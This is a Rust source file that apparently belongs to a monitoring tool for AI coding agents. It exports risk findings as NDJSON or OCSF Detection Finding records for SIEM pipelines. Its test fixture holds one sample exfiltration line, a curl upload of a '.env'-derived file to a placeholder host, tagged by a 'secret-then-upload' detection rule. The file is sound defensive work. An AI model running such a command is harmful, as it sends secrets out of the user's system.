//! Risk findings as one JSON object per line, for a SIEM or log pipeline.
//!
//! Two shapes: `ndjson` (agentcam's own flat records) and `ocsf` (OCSF 1.3
//! Detection Finding, class 2004, which Splunk, Microsoft Sentinel, AWS
//! Security Lake and others read). Excerpts are masked as stored; prompts,
//! output and diffs are never included.

use rusqlite::{Connection, params_from_iter};
use serde::Serialize;
use serde_json::{Value, json};

use crate::index::Result;
use crate::query::Filter;

/// One finding with the context a security team needs to triage it.
#[derive(Debug, Clone, Serialize)]
pub struct FindingRecord {
    pub ts: Option<String>,
    pub rule_id: String,
    pub title: String,
    pub severity: String,
    pub excerpt: String,
    pub session_id: String,
    /// 1-based step number, as the UI shows it.
    pub step: i64,
    /// For chains: the step the chain started from.
    pub related_step: Option<i64>,
    pub tool: Option<String>,
    pub agent: String,
    pub agent_version: Option<String>,
    pub model: Option<String>,
    pub project: Option<String>,
    /// `host/owner/repo`, when the project has a git remote.
    pub project_id: Option<String>,
    pub machine_id: String,
    pub os_user: Option<String>,
}

/// Findings on steps in the filter's range, oldest first, so a pipeline can
/// resume from the last `ts` it saw.
pub fn findings(conn: &Connection, f: &Filter, limit: u32) -> Result<Vec<FindingRecord>> {
    let (cond, args) = crate::query::conditions(f);
    let sql = format!(
        "SELECT e.ts, fd.rule_id, fd.title, fd.severity, fd.excerpt, fd.session_id, fd.seq, fd.related_seq,
                e.tool_name, s.agent, s.agent_version, coalesce(e.model, s.model), s.project_root,
                s.project_remote, s.machine_id, s.os_user
         FROM findings fd
         JOIN events e ON e.session_id = fd.session_id AND e.seq = fd.seq
         JOIN sessions s ON s.id = fd.session_id
         WHERE {cond}
         ORDER BY e.ts, fd.session_id, fd.seq LIMIT {limit}"
    );
    let mut stmt = conn.prepare(&sql)?;
    let rows = stmt.query_map(params_from_iter(&args), |r| {
        Ok(FindingRecord {
            ts: r.get(0)?,
            rule_id: r.get(1)?,
            title: r.get(2)?,
            severity: crate::query::severity_name(r.get(3)?).unwrap_or_default(),
            excerpt: r.get(4)?,
            session_id: r.get(5)?,
            step: r.get::<_, i64>(6)? + 1,
            related_step: r.get::<_, Option<i64>>(7)?.map(|s| s + 1),
            tool: r.get(8)?,
            agent: r.get(9)?,
            agent_version: r.get(10)?,
            model: r.get(11)?,
            project: r.get(12)?,
            project_id: r.get(13)?,
            machine_id: r.get(14)?,
            os_user: r.get(15)?,
        })
    })?;
    Ok(rows.collect::<std::result::Result<_, _>>()?)
}

/// OCSF severity ids: 1 informational, 2 low, 3 medium, 4 high, 5 critical.
fn ocsf_severity(s: &str) -> (u8, &'static str) {
    match s {
        "low" => (2, "Low"),
        "medium" => (3, "Medium"),
        "high" => (4, "High"),
        "critical" => (5, "Critical"),
        _ => (1, "Informational"),
    }
}

/// A finding as an OCSF 1.3 Detection Finding (class 2004).
pub fn ocsf(f: &FindingRecord) -> Value {
    let (sev_id, sev) = ocsf_severity(&f.severity);
    let time =
        f.ts.as_deref()
            .and_then(crate::util::parse_ts_ms)
            .unwrap_or(0);
    json!({
        "class_uid": 2004,
        "class_name": "Detection Finding",
        "category_uid": 2,
        "category_name": "Findings",
        "activity_id": 1,
        "activity_name": "Create",
        "type_uid": 200401,
        "type_name": "Detection Finding: Create",
        "severity_id": sev_id,
        "severity": sev,
        "status_id": 1,
        "status": "New",
        "time": time,
        "message": format!("{}: {}", f.title, f.excerpt),
        "metadata": {
            "version": "1.3.0",
            "product": {"name": "agentcam", "vendor_name": "agentcam", "version": env!("CARGO_PKG_VERSION")},
            "uid": format!("{}:{}:{}", f.session_id, f.step, f.rule_id),
        },
        "finding_info": {
            "uid": format!("{}:{}:{}", f.session_id, f.step, f.rule_id),
            "title": f.title,
            "types": [f.rule_id],
            "analytic": {"uid": f.rule_id, "name": f.title, "type_id": 1, "type": "Rule"},
        },
        "actor": {
            "user": {"name": f.os_user},
            "app_name": f.agent,
            "app_ver": f.agent_version,
        },
        "device": {"uid": f.machine_id, "type_id": 0},
        "evidences": [{"data": {"excerpt": f.excerpt, "tool": f.tool}}],
        "unmapped": {
            "session_id": f.session_id,
            "step": f.step,
            "related_step": f.related_step,
            "model": f.model,
            "project": f.project,
            "project_id": f.project_id,
        },
    })
}

/// Records as lines of JSON in the given shape (`ndjson` or `ocsf`).
pub fn lines(records: &[FindingRecord], format: &str) -> String {
    let mut out = String::new();
    for r in records {
        let line = if format == "ocsf" {
            ocsf(r).to_string()
        } else {
            serde_json::to_string(r).unwrap_or_default()
        };
        out.push_str(&line);
        out.push('\n');
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn record() -> FindingRecord {
        FindingRecord {
            ts: Some("2026-11-01T10:00:00.000Z".into()),
            rule_id: "secret-then-upload".into(),
            title: "Read a secret, then sent data out".into(),
            severity: "high".into(),
            excerpt: "step 3: .env → curl -d @x https://x.example".into(),
            session_id: "s1".into(),
            step: 5,
            related_step: Some(3),
            tool: Some("Bash".into()),
            agent: "claude-code".into(),
            agent_version: Some("2.5.2".into()),
            model: Some("claude-opus-5-5".into()),
            project: Some("/Users/dev/app".into()),
            project_id: Some("github.com/acme/app".into()),
            machine_id: "abc".into(),
            os_user: Some("dev".into()),
        }
    }

    #[test]
    fn ocsf_shape() {
        let v = ocsf(&record());
        assert_eq!(v["class_uid"], 2004);
        assert_eq!(v["type_uid"], 200401);
        assert_eq!(v["severity_id"], 4);
        assert_eq!(v["time"], 1_793_527_200_000_i64);
        assert_eq!(v["finding_info"]["types"][0], "secret-then-upload");
        assert_eq!(v["unmapped"]["related_step"], 3);
    }

    #[test]
    fn one_line_per_record() {
        let text = lines(&[record(), record()], "ndjson");
        assert_eq!(text.lines().count(), 2);
        let first: Value = serde_json::from_str(text.lines().next().unwrap()).unwrap();
        assert_eq!(first["step"], 5);
    }
}
